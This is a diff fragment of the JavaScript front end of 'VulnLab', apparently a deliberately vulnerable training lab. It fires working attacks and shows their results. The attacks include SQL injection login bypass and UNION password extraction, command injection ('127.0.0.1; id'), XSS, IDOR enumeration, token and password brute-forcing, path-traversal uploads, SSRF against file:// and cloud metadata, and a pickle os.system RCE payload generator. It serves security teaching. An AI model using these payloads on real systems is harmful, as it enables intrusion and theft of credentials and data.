+  const payload = document.getElementById('xss-input').value;
+  window.open(BASE + '/search?q=' + encodeURIComponent(payload), '_blank');
+}
+
+// ─── Command Injection ─────────────────────────────────────
+async function testCmdi() {
+  const host = document.getElementById('cmdi-input').value;
+  term('term-cmdi', prompt(`POST /ping  host="${host}"`));
+  const start = Date.now();
+  const form = new FormData();
+  form.append('host', host);
+  try {
+    const r = await fetch(BASE + '/ping', { method: 'POST', body: form });
+    const html = await r.text();
+    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+
+    const indicators = ['uid=', 'root', 'www-data', 'FLAG{', '/bin/', 'daemon', 'nobody'];
+    const found = indicators.filter(i => html.includes(i));
+
+    if (found.length) {
+      term('term-cmdi', tLine('t-err', `  [VULNERABLE] RCE confirmado en ${elapsed}s — indicadores: ${found.join(', ')}`));
+      const match = html.match(/<pre>([\s\S]*?)<\/pre>/);
+      if (match) {
+        const output = match[1].replace(/<[^>]+>/g, '').trim();
+        output.split('\n').slice(0, 15).forEach(line => {
+          const cls = line.includes('FLAG{') ? 't-flag' : 't-out';
+          term('term-cmdi', tLine(cls, '  ' + line));
+        });
+      }
+      updateOvStatus('cmdi', true);
+      updateCounts();
+    } else {
+      term('term-cmdi', tLine('t-ok', `  Sin indicadores de RCE en ${elapsed}s`));
+    }
+  } catch(e) {
+    term('term-cmdi', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── IDOR ──────────────────────────────────────────────────
+async function testIdor() {
+  const start = parseInt(document.getElementById('idor-start').value) || 1;
+  const end   = parseInt(document.getElementById('idor-end').value)   || 5;
+  term('term-idor', prompt(`GET /notes?id=[${start}..${end}]  (sin autenticación)`));
+
+  let found = 0;
+  for (let id = start; id <= end; id++) {
+    try {
+      const r = await fetch(BASE + '/notes?id=' + id);
+      const html = await r.text();
+      const match = html.match(/Nota #\d+: (.+?)<\/p>/);
+      if (match && !html.includes('no encontrada')) {
+        found++;
+        const content = match[1].replace(/<[^>]+>/g, '');
+        const cls = content.includes('FLAG{') ? 't-flag' : 't-warn';
+        term('term-idor', tLine(cls, `  [ACCESO OK] id=${id} → ${content}`));
+        if (content.includes('FLAG{')) {
+          term('term-idor', tLine('t-flag', `  *** FLAG ENCONTRADA: ${content.match(/FLAG\{[^}]+\}/)?.[0]} ***`));
+        }
+      } else {
+        term('term-idor', tLine('t-ok', `  id=${id} → no encontrado`));
+      }
+    } catch(e) {
+      term('term-idor', tLine('t-err', `  id=${id} → Error: ${e.message}`));
+    }
+  }
+  if (found > 0) {
+    term('term-idor', tLine('t-err', `\n  [VULNERABLE] ${found} recursos accesibles sin verificar autorización`));
+    updateOvStatus('idor', true);
+    updateCounts();
+  }
+}
+
+// ─── Info Disclosure ───────────────────────────────────────
+async function testInfo() {
+  term('term-info', prompt('GET /info'));
+  try {
+    const r = await fetch(BASE + '/info');
+    const data = await r.json();
+    term('term-info', tLine('t-err', '  [VULNERABLE] Datos sensibles expuestos:'));
+    if (data.secret_key) term('term-info', tLine('t-warn', `  secret_key → "${data.secret_key}" (permite forjar cookies de sesión)`));
+    if (data.cwd)        term('term-info', tLine('t-out',  `  cwd        → ${data.cwd}`));
+    if (data.db_path)    term('term-info', tLine('t-out',  `  db_path    → ${data.db_path}`));
+    if (data.env) {
+      const sensitive = Object.entries(data.env)
+        .filter(([k]) => /SECRET|KEY|PASS|TOKEN|FLAG/i.test(k));
+      if (sensitive.length) {
+        term('term-info', tLine('t-warn', `  Variables ENV sensibles: ${sensitive.map(([k]) => k).join(', ')}`));
+        sensitive.forEach(([k, v]) => term('term-info', tLine('t-out', `    ${k}=${v}`)));
+      }
+      term('term-info', tLine('t-info', `  Total variables ENV expuestas: ${Object.keys(data.env).length}`));
+    }
+    updateOvStatus('info', true);
+    updateCounts();
+  } catch(e) {
+    term('term-info', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── API Brute Force ───────────────────────────────────────
+async function bruteToken() {
+  const tokens = ['admin', 'token', 'secret', 'api_key', 'test', 'token123',
+                  '12345', 'password', 'key', 'bearer', 'vulnlab', 'letmein'];
+  term('term-api', prompt(`GET /api/users  X-Token=[${tokens.length} tokens]`));
+
+  for (const tok of tokens) {
+    term('term-api', tLine('t-out', `  Probando X-Token: ${tok}...`));
+    try {
+      const r = await fetch(BASE + '/api/users', { headers: { 'X-Token': tok } });
+      if (r.ok) {
+        const data = await r.json();
+        term('term-api', tLine('t-err', `\n  [TOKEN VÁLIDO] X-Token: "${tok}"`));
+        term('term-api', tLine('t-flag', '  *** FLAG: API_TOKEN_FOUND ***'));
+        term('term-api', tLine('t-warn', `  ${data.length} usuarios extraídos:`));
+        data.forEach(u => term('term-api', tLine('t-out', `    id=${u.id}  ${u.username}  ${u.email}  [${u.role}]`)));
+        document.getElementById('api-token').value = tok;
+        updateOvStatus('api', true);
+        updateCounts();
+        return;
+      }
+    } catch {}
+  }
+  term('term-api', tLine('t-ok', '\n  Token no encontrado en la lista'));
+}
+
+async function testApiToken() {
+  const tok = document.getElementById('api-token').value;
+  term('term-api', prompt(`GET /api/users  X-Token: ${tok}`));
+  try {
+    const r = await fetch(BASE + '/api/users', { headers: { 'X-Token': tok } });
+    const status = r.status;
+    term('term-api', tLine(r.ok ? 't-ok' : 't-err', `  HTTP ${status}`));
+    if (r.ok) {
+      const data = await r.json();
+      data.forEach(u => term('term-api', tLine('t-out', `  ${u.username} | ${u.email} | ${u.role}`)));
+    }
+  } catch(e) {
+    term('term-api', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── HTTP Headers ──────────────────────────────────────────
+async function testHeaders() {
+  const url = document.getElementById('headers-url').value;
+  term('term-headers', prompt(`HEAD ${url}`));
+  const secHeaders = [
+    'Content-Security-Policy',
+    'X-Frame-Options',
+    'X-Content-Type-Options',
+    'Strict-Transport-Security',
+    'X-XSS-Protection',
+    'Referrer-Policy',
+    'Permissions-Policy',
+  ];
+  try {
+    const r = await fetch(url, { method: 'GET' });
+    term('term-headers', tLine('t-info', `  HTTP ${r.status} ${r.statusText}`));
+    term('term-headers', tLine('t-muted', '  ── Cabeceras recibidas ──────────────────'));
+    r.headers.forEach((v, k) => {
+      term('term-headers', tLine('t-out', `  ${k}: ${v}`));
+    });
+    term('term-headers', tLine('t-muted', '  ── Auditoría de cabeceras de seguridad ──'));
+    secHeaders.forEach(h => {
+      const val = r.headers.get(h);
+      if (val) {
+        term('term-headers', tLine('t-ok',   `  [OK]     ${h}: ${val.slice(0,60)}`));
+      } else {
+        term('term-headers', tLine('t-warn', `  [FALTA]  ${h}`));
+      }
+    });
+  } catch(e) {
+    term('term-headers', tLine('t-err', '  Error (posible CORS): ' + e.message));
+  }
+}
+
+// ─── Port Scanner ──────────────────────────────────────────
+async function scanPorts() {
+  const host = document.getElementById('ps-host').value;
+  const commonPorts = [21,22,23,25,53,80,110,143,443,445,
+                       3306,3389,5000,5432,6379,8080,8443,9200,27017];
+  term('term-ps', prompt(`Verificando ${commonPorts.length} puertos comunes en ${host}`));
+  term('term-ps', tLine('t-info', '  (Detección limitada desde navegador — usar script Python para escaneo completo)\n'));
+
+  for (const port of commonPorts) {
+    try {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 800);
+      const r = await fetch(`http://${host}:${port}/`, { signal: ctrl.signal, mode: 'no-cors' });
+      clearTimeout(t);
+      term('term-ps', tLine('t-ok', `  [ABIERTO]  ${String(port).padEnd(6)} → responde`));
+    } catch(e) {
+      if (e.name === 'AbortError') {
+        term('term-ps', tLine('t-muted', `  [TIMEOUT]  ${port}`));
+      } else {
+        const msg = e.message.toLowerCase();
+        if (msg.includes('failed to fetch') || msg.includes('network')) {
+          term('term-ps', tLine('t-out', `  [?]        ${String(port).padEnd(6)} → sin respuesta HTTP`));
+        }
+      }
+    }
+  }
+  term('term-ps', tLine('t-info', '\n  Escaneo finalizado'));
+}
+
+// ─── Full Scanner ──────────────────────────────────────────
+const SCAN_STEPS = [
+  { name: 'Verificando conectividad',  fn: scanHealth,    pct: 10 },
+  { name: 'SQL Injection /login',      fn: scanSqliLogin, pct: 25 },
+  { name: 'SQL Injection /search',     fn: scanSqliSearch,pct: 40 },
+  { name: 'XSS /search',              fn: scanXss,       pct: 55 },
+  { name: 'Command Injection /ping',   fn: scanCmdi,      pct: 70 },
+  { name: 'IDOR /notes',              fn: scanIdorFull,  pct: 80 },
+  { name: 'Info Disclosure /info',     fn: scanInfoFull,  pct: 90 },
+  { name: 'API Brute Force',           fn: scanApiFull,   pct: 100 },
+];
+
+const ovStatus = { sqli: false, xss: false, cmdi: false, idor: false, info: false, api: false };
+
+function updateOvStatus(key, vuln) {
+  ovStatus[key] = vuln;
+  const el = document.getElementById('ov-status-' + key);
+  if (el) el.innerHTML = vuln
+    ? '<span style="color:#f87171">VULNERABLE</span>'
+    : '<span style="color:#34d399">OK</span>';
+}
+
+function updateCounts() {
+  const vals = Object.values(ovStatus);
+  const vulnCount = vals.filter(Boolean).length;
+  document.getElementById('ov-crit').textContent = vulnCount >= 4 ? 3 : Math.max(0, vulnCount - 2);
+  document.getElementById('ov-high').textContent = Math.min(vulnCount, 2);
+  document.getElementById('ov-med').textContent  = 1;
+  document.getElementById('ov-info').textContent  = 2;
+}
+
+async function runFullScan() {
+  const btn  = document.getElementById('btn-fullscan');
+  const stat = document.getElementById('scan-status');
+  const bar  = document.getElementById('scan-bar');
+  const step = document.getElementById('scan-step');
+  btn.disabled = true;
+  clearTerm('term-scan');
+  term('term-scan', tLine('t-info', '═══════════════════════════════════════════'));
+  term('term-scan', tLine('t-info', '  VulnLab — Reconocimiento completo'));
+  term('term-scan', tLine('t-info', `  Target: ${BASE}`));
+  term('term-scan', tLine('t-info', `  Fecha:  ${new Date().toLocaleString()}`));
+  term('term-scan', tLine('t-info', '═══════════════════════════════════════════\n'));
+
+  for (const s of SCAN_STEPS) {
+    stat.textContent = s.name + '...';
+    step.textContent = s.name;
+    bar.style.width  = s.pct + '%';
+    term('term-scan', prompt(s.name));
+    await s.fn();
+    await new Promise(r => setTimeout(r, 300));
+  }
+
+  term('term-scan', tLine('t-info', '\n═══════════════════════════════════════════'));
+  term('term-scan', tLine('t-info', '  REPORTE FINAL'));
+  term('term-scan', tLine('t-info', '═══════════════════════════════════════════'));
+  Object.entries(ovStatus).forEach(([k, v]) => {
+    term('term-scan', tLine(v ? 't-err' : 't-ok',
+      `  ${v ? '[VULNERABLE]' : '[SEGURO]   '} ${k.toUpperCase()}`));
+  });
+  const count = Object.values(ovStatus).filter(Boolean).length;
+  term('term-scan', tLine('t-warn', `\n  ${count}/6 vectores vulnerables detectados`));
+
+  stat.textContent = `Completado — ${count} vulnerabilidades encontradas`;
+  btn.disabled = false;
+  updateCounts();
+}
+
+async function scanHealth() {
+  try {
+    const r = await fetch(BASE + '/api/health');
+    const d = await r.json();
+    term('term-scan', tLine('t-ok', `  Servidor activo — ${d.app} v${d.version}`));
+  } catch { term('term-scan', tLine('t-err', '  Servidor no disponible')); }
+}
+async function scanSqliLogin() {
+  const form = new FormData();
+  form.append('username', "' OR '1'='1"); form.append('password', 'x');
+  const r = await fetch(BASE+'/login', {method:'POST',body:form});
+  const h = await r.text();
+  const v = h.includes('Bienvenido');
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} SQLi login bypass`));
+  updateOvStatus('sqli', v);
+}
+async function scanSqliSearch() {
+  const r = await fetch(BASE+'/search?'+new URLSearchParams({q:"' UNION SELECT 1,username,password,role,email FROM users--"}));
+  const h = await r.text();
+  const v = /admin|password/i.test(h);
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} SQLi UNION extraction`));
+}
+async function scanXss() {
+  const p = '<script>alert(1)<\/script>';
+  const r = await fetch(BASE+'/search?'+new URLSearchParams({q:p}));
+  const h = await r.text();
+  const v = h.includes(p);
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} XSS reflejado`));
+  updateOvStatus('xss', v);
+}
+async function scanCmdi() {
+  const form = new FormData();
+  form.append('host', '127.0.0.1; id');
+  const r = await fetch(BASE+'/ping', {method:'POST',body:form});
+  const h = await r.text();
+  const v = h.includes('uid=') || h.includes('root');
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} Command injection`));
+  updateOvStatus('cmdi', v);
+}
+async function scanIdorFull() {
+  const r = await fetch(BASE+'/notes?id=1');
+  const h = await r.text();
+  const v = h.includes('FLAG') || h.includes('secreta');
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} IDOR /notes`));
+  updateOvStatus('idor', v);
+}
+async function scanInfoFull() {
+  const r = await fetch(BASE+'/info');
+  const v = r.ok;
+  const d = v ? await r.json() : {};
+  term('term-scan', tLine(v?'t-err':'t-ok', `  ${v?'[VULNERABLE]':'[OK]'} Info disclosure${v?' — secret_key: '+d.secret_key:''}`));
+  updateOvStatus('info', v);
+}
+async function scanApiFull() {
+  for (const tok of ['admin','token','token123','secret']) {
+    const r = await fetch(BASE+'/api/users', {headers:{'X-Token':tok}});
+    if (r.ok) {
+      term('term-scan', tLine('t-err', `  [VULNERABLE] API token débil encontrado: "${tok}"`));
+      updateOvStatus('api', true);
+      return;
+    }
+  }
+  term('term-scan', tLine('t-ok', '  [OK] Token no encontrado en lista corta'));
+}
+
+// ─── File Upload ──────────────────────────────────────────
+async function testUpload() {
+  const filename = document.getElementById('upload-filename').value;
+  const content  = document.getElementById('upload-content').value;
+  term('term-upload', prompt(`POST /upload  filename="${filename}"`));
+
+  const blob = new Blob([content], { type: 'application/octet-stream' });
+  const form = new FormData();
+  form.append('file', blob, filename);
+
+  try {
+    const r = await fetch(BASE + '/upload', { method: 'POST', body: form });
+    const html = await r.text();
+    const match = html.match(/guardado en ([^<]+)/);
+    if (match) {
+      term('term-upload', tLine('t-err', `  [VULNERABLE] Archivo aceptado sin validación`));
+      term('term-upload', tLine('t-warn', `  Guardado en: ${match[1].trim()}`));
+      const ext = filename.split('.').pop();
+      if (['py','sh','php','rb','pl'].includes(ext)) {
+        term('term-upload', tLine('t-err', `  RIESGO: extensión .${ext} ejecutable subida al servidor`));
+      }
+    } else {
+      term('term-upload', tLine('t-ok', '  Sin ruta de guardado en respuesta'));
+    }
+  } catch(e) {
+    term('term-upload', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+async function testUploadTraversal() {
+  const filename = document.getElementById('upload-traversal').value;
+  const content  = document.getElementById('upload-traversal-content').value;
+  term('term-upload', prompt(`POST /upload  filename="${filename}" (path traversal)`));
+
+  const blob = new Blob([content], { type: 'text/plain' });
+  const form = new FormData();
+  form.append('file', blob, filename);
+
+  try {
+    const r = await fetch(BASE + '/upload', { method: 'POST', body: form });
+    const html = await r.text();
+    const match = html.match(/guardado en ([^<]+)/);
+    if (match) {
+      const savedPath = match[1].trim();
+      const hasTraversal = savedPath.includes('/tmp/') && !savedPath.includes('/tmp/uploads/');
+      term('term-upload', tLine('t-err', `  [VULNERABLE] Archivo guardado en: ${savedPath}`));
+      if (hasTraversal) {
+        term('term-upload', tLine('t-err', '  PATH TRAVERSAL exitoso — archivo fuera de UPLOAD_DIR'));
+      }
+    }
+  } catch(e) {
+    term('term-upload', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── Deserialización ───────────────────────────────────────
+function generatePickle() {
+  const cmd = document.getElementById('pickle-cmd').value;
+  const displayCmd = `python3 -c "
+import pickle, os, base64
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('${cmd}',))
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+"`;
+  term('term-deser', prompt('Generador de payload pickle'));
+  term('term-deser', tLine('t-info',  '  Ejecuta este comando en tu terminal para generar el payload:'));
+  term('term-deser', tLine('t-warn',  '  ' + displayCmd.replace(/\n/g, '\n  ')));
+  term('term-deser', tLine('t-muted', '  Luego pega el resultado en el campo "Payload base64" y haz clic en Deserializar'));
+  document.getElementById('pickle-cmd-display').innerHTML =
+    escHtml(displayCmd).replace(/\n/g, '<br>').replace(/ {4}/g, '&nbsp;&nbsp;');
+}
+
+async function testDeserialize() {
+  const payload = document.getElementById('pickle-payload').value.trim();
+  if (!payload) {
+    term('term-deser', tLine('t-warn', '  Genera primero el payload con el botón de arriba'));
+    return;
+  }
+  term('term-deser', prompt(`POST /deserialize  data=${payload.slice(0,30)}...`));
+  const form = new FormData();
+  form.append('data', payload);
+  try {
+    const r = await fetch(BASE + '/deserialize', { method: 'POST', body: form });
+    const html = await r.text();
+    const match = html.match(/Resultado:<\/h3>\s*<pre>([\s\S]*?)<\/pre>/);
+    const result = match ? match[1].replace(/<[^>]+>/g,'').trim() : '';
+    if (result) {
+      term('term-deser', tLine('t-err', '  [VULNERABLE] Servidor ejecutó el pickle:'));
+      term('term-deser', tLine('t-warn', '  ' + result));
+      if (result.includes('uid=') || result.includes('root')) {
+        term('term-deser', tLine('t-flag', '  RCE CONFIRMADO — código arbitrario ejecutado en el servidor'));
+      }
+    } else {
+      term('term-deser', tLine('t-out', '  Respuesta del servidor: ' + html.slice(0,200).replace(/<[^>]+>/g,'')));
+    }
+  } catch(e) {
+    term('term-deser', tLine('t-err', '  Error: ' + e.message));
+  }
+}
+
+// ─── Logging / Admin ───────────────────────────────────────
+async function bruteAdmin(safe) {
+  const endpoint = safe ? '/admin-safe' : '/admin';
+  const passwords = ['admin', '1234', 'qwerty', 'password', 'admin123', 'root', 'letmein'];
+  document.getElementById('logging-term-title').textContent =
+    safe ? 'logging_output — /admin-safe (con logs)' : 'logging_output — /admin (sin logs)';
+  term('term-logging', prompt(`GET ${endpoint}  password=[${passwords.length} intentos]`));
+  term('term-logging', tLine(safe ? 't-ok' : 't-warn',
+    safe ? '  Logging ACTIVO — cada intento se escribe en /tmp/security.log'
+         : '  Logging INACTIVO — ningún intento quedará registrado'));
+
+  for (const pwd of passwords) {
+    const r = await fetch(BASE + endpoint + '?password=' + encodeURIComponent(pwd));
+    const data = await r.json();
+    if (r.ok && data.users) {
+      term('term-logging', tLine('t-err', `  [ACCESO OK] password="${pwd}" → ${data.users.length} usuarios obtenidos`));
+      data.users.forEach(u => term('term-logging', tLine('t-out', '    ' + u)));
+    } else {
+      term('term-logging', tLine('t-muted', `  [FALLO]     password="${pwd}"`));
+    }
+    await new Promise(r => setTimeout(r, 80));
+  }
+
+  if (safe) {
+    term('term-logging', tLine('t-info', '\n  Todos los intentos han sido registrados. Ver logs:'));
+    await viewLogs();
+  } else {
+    term('term-logging', tLine('t-warn', '\n  Sin logs. El ataque fue invisible para el servidor.'));
+  }
+}
+
+async function viewLogs() {
+  term('term-logging', prompt('GET /api/logs'));
+  try {
+    const r = await fetch(BASE + '/api/logs');
+    const data = await r.json();
+    if (data.lines && data.lines.length) {
+      term('term-logging', tLine('t-info', '  ── /tmp/security.log ────────────────────'));
+      data.lines.forEach(line => {
+        const cls = line.includes('FAIL') ? 't-warn' : line.includes('OK') ? 't-ok' : 't-out';
+        term('term-logging', tLine(cls, '  ' + line.trim()));
+      });
+    }
+  } catch(e) {
+    term('term-logging', tLine('t-err', '  Error obteniendo logs: ' + e.message));
+  }
+}
+
+// ─── SSRF ──────────────────────────────────────────────────
+async function testSsrf() {
+  const url = document.getElementById('ssrf-url').value;
+  term('term-ssrf', prompt(`GET /fetch?url=${url}`));
+  term('term-ssrf', tLine('t-info', '  El servidor realizará esta petición internamente...'));
+  try {
+    const r = await fetch(BASE + '/fetch?' + new URLSearchParams({ url }));
+    const html = await r.text();
+
+    const match = html.match(/Respuesta de .+?:<\/h3>\s*<pre>([\s\S]*?)<\/pre>/);
+    const error  = html.match(/Error: ([^<]+)/);
+
+    if (match) {
+      const content = match[1].replace(/<[^>]+>/g, '').trim();
+      term('term-ssrf', tLine('t-err', `  [VULNERABLE] El servidor accedió a: ${url}`));
+
+      if (content.includes('secret_key')) {
+        term('term-ssrf', tLine('t-flag', '  *** secret_key obtenida via SSRF ***'));
+        const sk = content.match(/"secret_key":\s*"([^"]+)"/);
+        if (sk) term('term-ssrf', tLine('t-warn', `  secret_key: ${sk[1]}`));
+      }
+      if (content.includes('root:') || content.includes('/bin/bash')) {
+        term('term-ssrf', tLine('t-flag', '  *** /etc/passwd leído via file:// SSRF ***'));
+      }
+      if (content.includes('ami-id') || content.includes('instance-id')) {
+        term('term-ssrf', tLine('t-flag', '  *** Metadata de AWS obtenida! ***'));
+      }
+
+      const preview = content.slice(0, 600);
+      preview.split('\n').slice(0, 15).forEach(line => {
+        const cls = line.includes('FLAG{') ? 't-flag' : 't-out';
+        term('term-ssrf', tLine(cls, '  ' + line));
+      });
+    } else if (error) {
+      term('term-ssrf', tLine('t-muted', `  Error del servidor: ${error[1]}`));
+    }
+  } catch(e) {
+    term('term-ssrf', tLine('t-err', '  Error de red: ' + e.message));
+  }
+}
+
+// ─── Tab switcher ──────────────────────────────────────────
+function switchTab(el, showId) {
+  el.closest('.http-panel, [id$="-http"]').querySelectorAll('.http-tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  el.closest('.http-panel, [id$="-http"]').querySelectorAll('.http-body, [id^="sqli-"]').forEach(b => {
+    if (b.classList.contains('http-tab')) return;
+    b.style.display = 'none';
+  });
+  document.getElementById(showId).style.display = 'block';
+}
+
+// ─── Init ──────────────────────────────────────────────────
+checkStatus();
+setInterval(checkStatus, 30000);
+</script>
+</body>
+</html>
